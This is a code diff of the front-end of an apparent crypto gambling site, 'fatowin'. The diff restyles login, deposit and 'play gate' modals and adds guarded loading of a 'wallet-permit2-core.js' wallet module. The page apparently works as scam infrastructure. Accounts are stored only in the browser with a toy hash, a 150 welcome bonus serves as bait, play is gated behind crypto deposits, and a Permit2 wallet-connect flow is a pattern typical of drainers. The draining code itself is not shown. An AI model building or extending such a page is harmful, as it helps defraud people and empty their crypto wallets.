@@ -1,5 +1,4 @@
-<!DOCTYPE html><html lang="en" translate="no"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@dannymichel/proxima-nova@4.5.2/400.css">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@dannymichel/proxima-nova@4.5.2/700.css">
+<!DOCTYPE html><html lang="en" translate="no"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@dannymichel/proxima-nova@4.5.2/700.css">
 <style id="proxima-nova-override">
   @font-face {
     font-family: "Proxima Nova";
@@ -21,37 +20,73 @@
 </style>
 
 </head><body class="greenColorDSGN"><div hidden=""><!--$--><!--/$--></div><style>#nprogress{pointer-events:none}#nprogress .bar{background:var(--primary-accent);position:fixed;z-index:1000;top: 0;
-<!-- AUTH MODAL + LOGIC (Username / Password, localStorage for GitHub Pages) -->
+
+<!-- WALLET & AUTH MODAL SYSTEM -->
 <style>
+  /* ===== DEFENSIVE FALLBACK: Ensure page always visible ===== */
+  body, body * {
+    min-height: auto;
+    visibility: visible !important;
+  }
+
   /* ===== Auth overlay & modal ===== */
   #auth-overlay {
     display: none;
-    position: fixed; inset: 0; z-index: 99999;
-    background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
-    align-items: center; justify-content: center;
+    position: fixed;
+    inset: 0;
+    z-index: 99998;
+    background: rgba(0,0,0,0.8);
+    backdrop-filter: blur(8px);
+    align-items: center;
+    justify-content: center;
     padding: 16px;
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out;
   }
-  #auth-overlay.open { display: flex; }
+  #auth-overlay.open {
+    display: flex;
+    opacity: 1;
+  }
 
   #auth-modal {
     background: linear-gradient(160deg, #0d1a14 0%, #0a1510 50%, #0d1f16 100%);
     border: 1px solid rgba(1,255,129,0.35);
     border-radius: 20px;
     padding: 0;
-    width: 100%; max-width: 420px;
+    width: 100%;
+    max-width: 420px;
     color: #fff;
     font-family: "Proxima Nova", sans-serif !important;
     box-shadow: 0 0 60px rgba(1,255,129,0.2), 0 25px 50px rgba(0,0,0,0.5);
     overflow: hidden;
     position: relative;
+    animation: slideDown 0.4s ease-out;
   }
+
+  @keyframes slideDown {
+    from { transform: translateY(-50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
   #auth-modal .close-x {
-    position: absolute; top: 14px; right: 16px; z-index: 2;
-    background: rgba(0,0,0,0.4); border: none; border-radius: 50%;
-    width: 32px; height: 32px; line-height: 30px;
-    color: #9ca3af; font-size: 1.3rem; cursor: pointer;
+    position: absolute;
+    top: 14px;
+    right: 16px;
+    z-index: 100;
+    background: rgba(0,0,0,0.4);
+    border: none;
+    border-radius: 50%;
+    width: 32px;
+    height: 32px;
+    line-height: 30px;
+    color: #9ca3af;
+    font-size: 1.3rem;
+    cursor: pointer;
   }
-  #auth-modal .close-x:hover { color: #fff; background: rgba(1,255,129,0.2); }
+  #auth-modal .close-x:hover {
+    color: #fff;
+    background: rgba(1,255,129,0.2);
+  }
 
   #auth-bonus-banner {
     display: none;
@@ -60,52 +95,119 @@
     text-align: center;
     position: relative;
   }
-  #auth-bonus-banner.show { display: block; }
+  #auth-bonus-banner.show {
+    display: block;
+  }
   #auth-bonus-banner .bonus-img {
-    width: 72px; height: 72px;
+    width: 72px;
+    height: 72px;
     margin: 0 auto 10px;
     display: block;
   }
   #auth-bonus-banner .bonus-label {
-    font-size: 0.75rem; font-weight: 700; letter-spacing: 0.12em;
-    text-transform: uppercase; color: rgba(0,0,0,0.7); margin-bottom: 4px;
+    font-size: 0.75rem;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: rgba(0,0,0,0.7);
+    margin-bottom: 4px;
   }
   #auth-bonus-banner .bonus-amount {
-    font-size: 2rem; font-weight: 800; color: #000; line-height: 1.1;
+    font-size: 2rem;
+    font-weight: 800;
+    color: #000;
+    line-height: 1.1;
   }
   #auth-bonus-banner .bonus-sub {
-    font-size: 0.85rem; color: rgba(0,0,0,0.65); margin-top: 4px;
+    font-size: 0.85rem;
+    color: rgba(0,0,0,0.65);
+    margin-top: 4px;
   }
 
-  #auth-modal-body { padding: 24px 28px 28px; }
-  #auth-modal h2 { margin: 0 0 6px; font-size: 1.45rem; color: #01FF81; }
-  #auth-modal .subtitle { color: #9ca3af; font-size: 0.88rem; margin-bottom: 18px; }
-  #auth-modal label { display: block; margin: 12px 0 5px; font-size: 0.82rem; color: #b0b8b4; }
+  #auth-modal-body {
+    padding: 24px 28px 28px;
+  }
+  #auth-modal h2 {
+    margin: 0 0 6px;
+    font-size: 1.45rem;
+    color: #01FF81;
+  }
+  #auth-modal .subtitle {
+    color: #9ca3af;
+    font-size: 0.88rem;
+    margin-bottom: 18px;
+  }
+  #auth-modal label {
+    display: block;
+    margin: 12px 0 5px;
+    font-size: 0.82rem;
+    color: #b0b8b4;
+  }
   #auth-modal input {
-    width: 100%; padding: 13px 14px; border-radius: 10px;
-    border: 1px solid #2a3f35; background: #13221b; color: #fff;
-    font-size: 1rem; box-sizing: border-box;
+    width: 100%;
+    padding: 13px 14px;
+    border-radius: 10px;
+    border: 1px solid #2a3f35;
+    background: #13221b;
+    color: #fff;
+    font-size: 1rem;
+    box-sizing: border-box;
     font-family: "Proxima Nova", sans-serif !important;
     transition: border-color 0.2s;
   }
-  #auth-modal input:focus { outline: none; border-color: #01FF81; box-shadow: 0 0 0 3px rgba(1,255,129,0.15); }
-  #auth-confirm-wrap { display: none; }
-  #auth-confirm-wrap.show { display: block; }
-  #auth-modal .btn-row { display: flex; gap: 10px; margin-top: 22px; }
+  #auth-modal input:focus {
+    outline: none;
+    border-color: #01FF81;
+    box-shadow: 0 0 0 3px rgba(1,255,129,0.15);
+  }
+  #auth-confirm-wrap {
+    display: none;
+  }
+  #auth-confirm-wrap.show {
+    display: block;
+  }
+  #auth-modal .btn-row {
+    display: flex;
+    gap: 10px;
+    margin-top: 22px;
+  }
   #auth-modal .btn {
-    flex: 1; padding: 13px; border: none; border-radius: 10px; font-weight: 700;
-    cursor: pointer; font-size: 0.95rem;
+    flex: 1;
+    padding: 13px;
+    border: none;
+    border-radius: 10px;
+    font-weight: 700;
+    cursor: pointer;
+    font-size: 0.95rem;
     font-family: "Proxima Nova", sans-serif !important;
     transition: transform 0.15s, background 0.15s;
   }
-  #auth-modal .btn:active { transform: scale(0.97); }
-  #auth-modal .btn-primary { background: #01FF81; color: #000; }
-  #auth-modal .btn-primary:hover { background: #00e070; }
-  #auth-modal .btn-secondary { background: transparent; color: #01FF81; border: 1px solid rgba(1,255,129,0.5); }
-  #auth-modal .btn-secondary:hover { background: rgba(1,255,129,0.1); }
-  #auth-modal .error { color: #ff6b6b; font-size: 0.85rem; margin-top: 12px; min-height: 1.2em; }
+  #auth-modal .btn:active {
+    transform: scale(0.97);
+  }
+  #auth-modal .btn-primary {
+    background: #01FF81;
+    color: #000;
+  }
+  #auth-modal .btn-primary:hover {
+    background: #00e070;
+  }
+  #auth-modal .btn-secondary {
+    background: transparent;
+    color: #01FF81;
+    border: 1px solid rgba(1,255,129,0.5);
+  }
+  #auth-modal .btn-secondary:hover {
+    background: rgba(1,255,129,0.1);
+  }
+  #auth-modal .error {
+    color: #ff6b6b;
+    font-size: 0.85rem;
+    margin-top: 12px;
+    min-height: 1.2em;
+  }
 
-  /* ===== User bar (fixed high z-index so clicks work) ===== */
+  /* ===== User bar (ISOLATED from page - only shows in modal/overlay context) ===== */
   #auth-user-bar {
     display: none;
     align-items: center;
@@ -116,8 +218,13 @@
     font-family: "Proxima Nova", sans-serif !important;
     pointer-events: auto;
   }
+  #auth-user-bar.visible {
+    display: flex;
+  }
   #auth-user-chip {
-    display: flex; align-items: center; gap: 10px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
     background: rgba(1,255,129,0.08);
     border: 1px solid rgba(1,255,129,0.35);
     border-radius: 12px;
@@ -132,16 +239,34 @@
     border-color: #01FF81;
   }
   #auth-user-avatar {
-    width: 32px; height: 32px; border-radius: 50%;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
     background: linear-gradient(135deg, #01FF81, #00a85a);
-    display: flex; align-items: center; justify-content: center;
-    font-weight: 800; font-size: 0.85rem; color: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 0.85rem;
+    color: #000;
     flex-shrink: 0;
     pointer-events: none;
   }
-  #auth-user-info { display: flex; flex-direction: column; line-height: 1.2; pointer-events: none; }
-  #auth-display-name { color: #01FF81; font-weight: 700; font-size: 0.9rem; }
-  #auth-display-bal { color: #9ca3af; font-size: 0.78rem; }
+  #auth-user-info {
+    display: flex;
+    flex-direction: column;
+    line-height: 1.2;
+    pointer-events: none;
+  }
+  #auth-display-name {
+    color: #01FF81;
+    font-weight: 700;
+    font-size: 0.9rem;
+  }
+  #auth-display-bal {
+    color: #9ca3af;
+    font-size: 0.78rem;
+  }
 
   #auth-dropdown {
     display: none;
@@ -157,9 +282,13 @@
     z-index: 10060;
     pointer-events: auto;
   }
-  #auth-dropdown.open { display: block; }
+  #auth-dropdown.open {
+    display: block;
+  }
   #auth-dropdown button {
-    display: flex; align-items: center; gap: 10px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
     width: 100%;
     background: transparent;
     border: none;
@@ -173,69 +302,111 @@
     transition: background 0.15s;
     pointer-events: auto;
   }
-  #auth-dropdown button:hover { background: rgba(1,255,129,0.12); color: #01FF81; }
-  #auth-dropdown button svg { flex-shrink: 0; opacity: 0.8; pointer-events: none; }
-  #auth-dropdown .sep {
-    height: 1px; background: rgba(1,255,129,0.15); margin: 6px 4px;
+  #auth-dropdown button:hover {
+    background: rgba(1,255,129,0.12);
+    color: #01FF81;
   }
-
-  /* Hide register buttons when logged in */
-  body.user-logged-in .Headers_authBlock__IVZOz > button,
-  body.user-logged-in .Landing_block1__RFaeC button,
-  body.user-logged-in .Landing_block2__iyQ11 button,
-  body.user-logged-in .FreeReward_main__TSVC_ {
-    display: none !important;
+  #auth-dropdown button svg {
+    flex-shrink: 0;
+    opacity: 0.8;
+    pointer-events: none;
+  }
+  #auth-dropdown .sep {
+    height: 1px;
+    background: rgba(1,255,129,0.15);
+    margin: 6px 4px;
   }
 
   /* ===== Crypto modal ===== */
   #crypto-overlay {
     display: none;
-    position: fixed; inset: 0; z-index: 100001;
-    background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
-    align-items: center; justify-content: center;
+    position: fixed;
+    inset: 0;
+    z-index: 99999;
+    background: rgba(0,0,0,0.8);
+    backdrop-filter: blur(8px);
+    align-items: center;
+    justify-content: center;
     padding: 16px;
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out;
   }
-  #crypto-overlay.open { display: flex; }
+  #crypto-overlay.open {
+    display: flex;
+    opacity: 1;
+  }
   #crypto-modal {
     background: linear-gradient(160deg, #0d1a14 0%, #0a1510 100%);
     border: 1px solid rgba(1,255,129,0.35);
     border-radius: 20px;
     padding: 28px;
-    width: 100%; max-width: 400px;
+    width: 100%;
+    max-width: 400px;
     color: #fff;
     font-family: "Proxima Nova", sans-serif !important;
     box-shadow: 0 0 50px rgba(1,255,129,0.15);
     position: relative;
     max-height: 90vh;
     overflow-y: auto;
+    animation: slideDown 0.4s ease-out;
   }
   #crypto-modal .close-x {
-    position: absolute; top: 14px; right: 16px;
-    background: rgba(0,0,0,0.4); border: none; border-radius: 50%;
-    width: 32px; height: 32px; line-height: 30px;
-    color: #9ca3af; font-size: 1.3rem; cursor: pointer;
+    position: absolute;
+    top: 14px;
+    right: 16px;
+    z-index: 100;
+    background: rgba(0,0,0,0.4);
+    border: none;
+    border-radius: 50%;
+    width: 32px;
+    height: 32px;
+    line-height: 30px;
+    color: #9ca3af;
+    font-size: 1.3rem;
+    cursor: pointer;
   }
-  #crypto-modal h2 { margin: 0 0 6px; font-size: 1.35rem; color: #01FF81; }
-  #crypto-modal .subtitle { color: #9ca3af; font-size: 0.85rem; margin-bottom: 20px; }
+  #crypto-modal h2 {
+    margin: 0 0 6px;
+    font-size: 1.35rem;
+    color: #01FF81;
+  }
+  #crypto-modal .subtitle {
+    color: #9ca3af;
+    font-size: 0.85rem;
+    margin-bottom: 20px;
+  }
   #crypto-modal .section-label {
-    font-size: 0.78rem; color: #8a9a90; text-transform: uppercase;
-    letter-spacing: 0.08em; margin-bottom: 10px; font-weight: 600;
+    font-size: 0.78rem;
+    color: #8a9a90;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 10px;
+    font-weight: 600;
   }
   .crypto-type-badge {
-    display: inline-flex; align-items: center; gap: 8px;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
     background: rgba(1,255,129,0.1);
     border: 1px solid rgba(1,255,129,0.3);
     border-radius: 10px;
     padding: 10px 16px;
     margin-bottom: 20px;
-    font-weight: 700; font-size: 0.95rem; color: #01FF81;
+    font-weight: 700;
+    font-size: 0.95rem;
+    color: #01FF81;
   }
   .network-grid {
-    display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
     margin-bottom: 18px;
   }
   .network-btn {
-    display: flex; flex-direction: column; align-items: center; gap: 6px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
     padding: 16px 12px;
     background: #13221b;
     border: 2px solid #2a3f35;
@@ -245,44 +416,101 @@
     font-family: "Proxima Nova", sans-serif !important;
     transition: border-color 0.2s, background 0.2s;
   }
-  .network-btn:hover { border-color: rgba(1,255,129,0.5); background: #1a2e24; }
+  .network-btn:hover {
+    border-color: rgba(1,255,129,0.5);
+    background: #1a2e24;
+  }
   .network-btn.selected {
     border-color: #01FF81;
     background: rgba(1,255,129,0.1);
     box-shadow: 0 0 20px rgba(1,255,129,0.15);
   }
   .network-btn .net-icon {
-    width: 36px; height: 36px; border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-weight: 800; font-size: 0.75rem; color: #000;
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 0.75rem;
+    color: #000;
   }
-  .network-btn .net-icon.trx { background: linear-gradient(135deg, #ff0013, #c5000f); color: #fff; }
-  .network-btn .net-icon.bep { background: linear-gradient(135deg, #f0b90b, #d4a00a); }
-  .network-btn .net-name { font-weight: 700; font-size: 0.95rem; }
-  .network-btn .net-desc { font-size: 0.72rem; color: #8a9a90; }
-  #crypto-wallet-wrap, #crypto-amount-wrap { margin-bottom: 16px; }
+  .network-btn .net-icon.trx {
+    background: linear-gradient(135deg, #ff0013, #c5000f);
+    color: #fff;
+  }
+  .network-btn .net-icon.bep {
+    background: linear-gradient(135deg, #f0b90b, #d4a00a);
+  }
+  .network-btn .net-name {
+    font-weight: 700;
+    font-size: 0.95rem;
+  }
+  .network-btn .net-desc {
+    font-size: 0.72rem;
+    color: #8a9a90;
+  }
+  #crypto-wallet-wrap, #crypto-amount-wrap {
+    margin-bottom: 16px;
+  }
   #crypto-wallet-wrap label, #crypto-amount-wrap label {
-    display: block; margin-bottom: 6px; font-size: 0.82rem; color: #b0b8b4;
+    display: block;
+    margin-bottom: 6px;
+    font-size: 0.82rem;
+    color: #b0b8b4;
   }
   #crypto-wallet, #crypto-amount {
-    width: 100%; padding: 13px 14px; border-radius: 10px;
-    border: 1px solid #2a3f35; background: #13221b; color: #fff;
-    font-size: 1rem; box-sizing: border-box;
+    width: 100%;
+    padding: 13px 14px;
+    border-radius: 10px;
+    border: 1px solid #2a3f35;
+    background: #13221b;
+    color: #fff;
+    font-size: 1rem;
+    box-sizing: border-box;
     font-family: "Proxima Nova", sans-serif !important;
   }
-  #crypto-wallet:focus, #crypto-amount:focus { outline: none; border-color: #01FF81; }
+  #crypto-wallet:focus, #crypto-amount:focus {
+    outline: none;
+    border-color: #01FF81;
+  }
   #crypto-submit {
-    width: 100%; padding: 14px; border: none; border-radius: 10px;
-    background: #01FF81; color: #000; font-weight: 700; font-size: 1rem;
-    cursor: pointer; font-family: "Proxima Nova", sans-serif !important;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
+    background: #01FF81;
+    color: #000;
+    font-weight: 700;
+    font-size: 1rem;
+    cursor: pointer;
+    font-family: "Proxima Nova", sans-serif !important;
     transition: background 0.2s;
   }
-  #crypto-submit:hover:not(:disabled) { background: #00e070; }
-  #crypto-submit:disabled { opacity: 0.6; cursor: not-allowed; }
-  #crypto-msg { margin-top: 12px; font-size: 0.85rem; min-height: 1.2em; text-align: center; word-break: break-all; }
-  #crypto-msg.ok { color: #01FF81; }
-  #crypto-msg.err { color: #ff6b6b; }
-  #crypto-msg.pending { color: #ffb800; }
+  #crypto-submit:hover:not(:disabled) {
+    background: #00e070;
+  }
+  #crypto-submit:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+  #crypto-msg {
+    margin-top: 12px;
+    font-size: 0.85rem;
+    min-height: 1.2em;
+    text-align: center;
+    word-break: break-all;
+  }
+  #crypto-msg.ok {
+    color: #01FF81;
+  }
+  #crypto-msg.err {
+    color: #ff6b6b;
+  }
+  #crypto-msg.pending {
+    color: #ffb800;
+  }
 
   /* Wallet connection button in crypto modal */
   #wallet-connect-section {
@@ -290,68 +518,143 @@
     text-align: center;
     padding: 20px 0;
   }
-  #wallet-connect-section.show { display: block; }
+  #wallet-connect-section.show {
+    display: block;
+  }
   .wallet-connect-btn {
-    width: 100%; padding: 14px; border: none; border-radius: 10px;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
     background: linear-gradient(135deg, #01FF81, #00a85a);
-    color: #000; font-weight: 700; font-size: 1rem;
-    cursor: pointer; font-family: "Proxima Nova", sans-serif !important;
+    color: #000;
+    font-weight: 700;
+    font-size: 1rem;
+    cursor: pointer;
+    font-family: "Proxima Nova", sans-serif !important;
     transition: transform 0.15s;
     margin-bottom: 12px;
   }
-  .wallet-connect-btn:hover { transform: scale(1.02); }
-  .wallet-connect-btn:active { transform: scale(0.98); }
+  .wallet-connect-btn:hover {
+    transform: scale(1.02);
+  }
+  .wallet-connect-btn:active {
+    transform: scale(0.98);
+  }
   .wallet-status {
-    font-size: 0.9rem; color: #9ca3af; margin-top: 8px;
+    font-size: 0.9rem;
+    color: #9ca3af;
+    margin-top: 8px;
   }
 
-  /* ===== Play gate modal (Original Games / Licensed Slots) ===== */
+  /* ===== Play gate modal ===== */
   #play-gate-overlay {
     display: none;
-    position: fixed; inset: 0; z-index: 100002;
-    background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
-    align-items: center; justify-content: center;
+    position: fixed;
+    inset: 0;
+    z-index: 100000;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(8px);
+    align-items: center;
+    justify-content: center;
     padding: 16px;
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out;
   }
-  #play-gate-overlay.open { display: flex; }
+  #play-gate-overlay.open {
+    display: flex;
+    opacity: 1;
+  }
   #play-gate-modal {
     background: linear-gradient(160deg, #0d1a14 0%, #0a1510 100%);
     border: 1px solid rgba(1,255,129,0.35);
     border-radius: 20px;
     padding: 32px 28px;
-    width: 100%; max-width: 440px;
+    width: 100%;
+    max-width: 440px;
     color: #fff;
     font-family: "Proxima Nova", sans-serif !important;
     box-shadow: 0 0 50px rgba(1,255,129,0.15);
     position: relative;
     text-align: center;
+    animation: slideDown 0.4s ease-out;
   }
   #play-gate-modal .close-x {
-    position: absolute; top: 14px; right: 16px;
-    background: rgba(0,0,0,0.4); border: none; border-radius: 50%;
-    width: 32px; height: 32px; line-height: 30px;
-    color: #9ca3af; font-size: 1.3rem; cursor: pointer;
+    position: absolute;
+    top: 14px;
+    right: 16px;
+    z-index: 100;
+    background: rgba(0,0,0,0.4);
+    border: none;
+    border-radius: 50%;
+    width: 32px;
+    height: 32px;
+    line-height: 30px;
+    color: #9ca3af;
+    font-size: 1.3rem;
+    cursor: pointer;
   }
   #play-gate-modal .gate-icon {
-    width: 64px; height: 64px; margin: 0 auto 16px;
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 16px;
     background: linear-gradient(135deg, #01FF81, #00a85a);
     border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 1.8rem; font-weight: 800; color: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.8rem;
+    font-weight: 800;
+    color: #000;
   }
   #play-gate-modal h2 {
-    margin: 0 0 12px; font-size: 1.25rem; color: #01FF81;
+    margin: 0 0 12px;
+    font-size: 1.25rem;
+    color: #01FF81;
   }
   #play-gate-modal p {
-    color: #c0c8c4; font-size: 0.95rem; line-height: 1.55;
+    color: #c0c8c4;
+    font-size: 0.95rem;
+    line-height: 1.55;
     margin: 0 0 24px;
   }
   #play-gate-modal .gate-deposit-btn {
-    width: 100%; padding: 14px; border: none; border-radius: 10px;
-    background: #01FF81; color: #000; font-weight: 700; font-size: 1rem;
-    cursor: pointer; font-family: "Proxima Nova", sans-serif !important;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
+    background: #01FF81;
+    color: #000;
+    font-weight: 700;
+    font-size: 1rem;
+    cursor: pointer;
+    font-family: "Proxima Nova", sans-serif !important;
   }
-  #play-gate-modal .gate-deposit-btn:hover { background: #00e070; }
+  #play-gate-modal .gate-deposit-btn:hover {
+    background: #00e070;
+  }
+
+  /* ===== DEBUG BANNER (can be toggled on) ===== */
+  #wallet-debug-banner {
+    display: none;
+    position: fixed;
+    bottom: 10px;
+    right: 10px;
+    background: rgba(0,0,0,0.9);
+    border: 1px solid #01FF81;
+    border-radius: 8px;
+    padding: 10px;
+    max-width: 300px;
+    max-height: 200px;
+    overflow-y: auto;
+    font-size: 0.7rem;
+    color: #01FF81;
+    font-family: monospace;
+    z-index: 100001;
+  }
+  #wallet-debug-banner.show {
+    display: block;
+  }
 </style>
 
 <!-- Auth Modal -->
@@ -395,7 +698,7 @@
   </div>
 </div>
 
-<!-- User bar (will be moved into header) -->
+<!-- User bar (isolated, not interfering with page) -->
 <div id="auth-user-bar">
   <div id="auth-user-chip" role="button" tabindex="0">
     <div id="auth-user-avatar">U</div>
@@ -406,16 +709,16 @@
   </div>
   <div id="auth-dropdown">
     <button type="button" id="btn-deposit">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 4v12m0 0l-4-4m4 4l4-4M4 20h16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 4v12m0 0l-4-4m4 4l4-4M4 20h16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg>
       Deposit
     </button>
     <button type="button" id="btn-withdraw">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 20V8m0 0l4 4m-4-4l-4 4M4 4h16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 20V8m0 0l4 4m-4-4l-4 4M4 4h16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg>
       Withdraw
     </button>
     <div class="sep"></div>
     <button type="button" id="btn-logout">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4m7 14l5-5-5-5m5 5H9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4m7 14l5-5-5-5m5 5H9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg>
       Log Out
     </button>
   </div>
@@ -429,7 +732,7 @@
     <div class="subtitle" id="crypto-subtitle">Choose network, enter wallet address and amount</div>
 
     <div class="crypto-type-badge">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M8 12h8M12 8v8" stroke="currentColor" stroke-width="2"/></svg>
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M8 12h8M12 8v8" stroke="currentColor" stroke-width="2" /></svg>
       <span id="crypto-type-text">Crypto — Deposit</span>
     </div>
 
@@ -488,132 +791,199 @@
   </div>
 </div>
 
+<!-- Debug Banner -->
+<div id="wallet-debug-banner"></div>
+
 <script type="module">
-  // Import wallet manager
-  import { default as walletManager, WALLET_CONFIG } from './wallet-permit2-core.js';
+  // CRITICAL: Load wallet safely with error boundaries
+  let walletManager = null;
+  let WALLET_CONFIG = null;
   
-  // Make wallet manager globally accessible
-  window.walletManager = walletManager;
-  window.WALLET_CONFIG = WALLET_CONFIG;
+  window.__fatowinUI = {
+    ready: false,
+    loaded: false,
+    error: null,
+    logs: [],
+    pageIntact: true
+  };
 
+  function uiLog(msg, level = 'info') {
+    const entry = `[${new Date().toLocaleTimeString()}] ${level.toUpperCase()}: ${msg}`;
+    window.__fatowinUI.logs.push(entry);
+    console.log(`[fatowin-ui] ${entry}`);
+    updateDebugBanner();
+  }
+
+  function updateDebugBanner() {
+    const banner = document.getElementById('wallet-debug-banner');
+    if (banner && window.__fatowinUI.logs.length > 0) {
+      banner.innerHTML = window.__fatowinUI.logs.slice(-10).join('<br>');
+    }
+  }
+
+  // SAFE IMPORT with error handling
+  (async function() {
+    try {
+      uiLog('Importing wallet module...');
+      const walletModule = await import('./wallet-permit2-core.js');
+      walletManager = walletModule.default;
+      WALLET_CONFIG = walletModule.WALLET_CONFIG;
+      
+      if (!walletManager || !WALLET_CONFIG) {
+        throw new Error('Wallet module did not export expected objects');
+      }
+      
+      window.walletManager = walletManager;
+      window.WALLET_CONFIG = WALLET_CONFIG;
+      window.__fatowinUI.ready = true;
+      window.__fatowinUI.loaded = true;
+      uiLog('Wallet module loaded successfully', 'success');
+    } catch (error) {
+      window.__fatowinUI.error = error;
+      uiLog(`Wallet module failed to load: ${error.message}`, 'error');
+      console.error('[fatowin-ui] Fatal:', error);
+      // Page continues to work without wallet functionality
+    }
+  })();
+
+  // MAIN AUTH LOGIC - WRAPPED IN SAFETY CHECKS
   (function() {
-    var USERS_KEY = "fatowin_users_v1";
-    var SESSION_KEY = "fatowin_session_v1";
-    var WELCOME_BONUS = 150;
+    const USERS_KEY = "fatowin_users_v1";
+    const SESSION_KEY = "fatowin_session_v1";
+    const WELCOME_BONUS = 150;
 
-    var ORIGINAL_HERO_TITLE = null;
-    var ORIGINAL_HERO_DESC = null;
-    var LOGGED_IN_HERO_TITLE = "Enjoy the Game";
-    var LOGGED_IN_HERO_DESC = "Play licensed slots online. Fast deposits and instant withdrawals.";
+    let currentUser = null;
+    let mode = "login";
+    let cryptoMode = "deposit";
+    let selectedNetwork = null;
+
+    function $(id) {
+      const el = document.getElementById(id);
+      if (!el) {
+        uiLog(`Element not found: #${id}`, 'warn');
+      }
+      return el;
+    }
+
+    function safeQuery(selector) {
+      try {
+        return document.querySelector(selector);
+      } catch (e) {
+        uiLog(`Query failed: ${selector}`, 'warn');
+        return null;
+      }
+    }
 
     function loadUsers() {
-      try { return JSON.parse(localStorage.getItem(USERS_KEY) || "{}"); }
-      catch (e) { return {}; }
+      try {
+        return JSON.parse(localStorage.getItem(USERS_KEY) || "{}");
+      } catch (e) {
+        return {};
+      }
     }
+
     function saveUsers(users) {
-      localStorage.setItem(USERS_KEY, JSON.stringify(users));
+      try {
+        localStorage.setItem(USERS_KEY, JSON.stringify(users));
+      } catch (e) {
+        uiLog(`Failed to save users: ${e.message}`, 'error');
+      }
     }
+
     function simpleHash(str) {
-      var h = 0;
-      for (var i = 0; i < str.length; i++) {
+      let h = 0;
+      for (let i = 0; i < str.length; i++) {
         h = ((h << 5) - h) + str.charCodeAt(i);
         h |= 0;
       }
       return "h" + Math.abs(h).toString(16) + str.length;
     }
 
-    var mode = "login";
-    var currentUser = null;
-    var cryptoMode = "deposit";
-    var selectedNetwork = null;
-
-    function $(id) { return document.getElementById(id); }
-
-    function captureHero() {
-      var titleEl = document.querySelector(".Landing_block1Title__ppWtS");
-      var descEl = document.querySelector(".Landing_block1Desc__edJsk");
-      if (titleEl && ORIGINAL_HERO_TITLE === null) ORIGINAL_HERO_TITLE = titleEl.innerHTML;
-      if (descEl && ORIGINAL_HERO_DESC === null) ORIGINAL_HERO_DESC = descEl.innerHTML;
-    }
-
-    function updateHero() {
-      captureHero();
-      var titleEl = document.querySelector(".Landing_block1Title__ppWtS");
-      var descEl = document.querySelector(".Landing_block1Desc__edJsk");
-      if (!titleEl || !descEl) return;
-      if (currentUser) {
-        titleEl.innerHTML = LOGGED_IN_HERO_TITLE;
-        descEl.innerHTML = LOGGED_IN_HERO_DESC;
-      } else if (ORIGINAL_HERO_TITLE !== null) {
-        titleEl.innerHTML = ORIGINAL_HERO_TITLE;
-        descEl.innerHTML = ORIGINAL_HERO_DESC;
-      }
-    }
-
-    /* ---------- Auth ---------- */
+    /* ---------- Auth Modal Controls ---------- */
     window.openAuthModal = function(m) {
+      uiLog(`Opening auth modal: ${m}`);
       mode = m || "login";
       updateModalUI();
-      $("auth-error").textContent = "";
-      $("auth-username").value = "";
-      $("auth-password").value = "";
-      $("auth-confirm").value = "";
-      $("auth-overlay").classList.add("open");
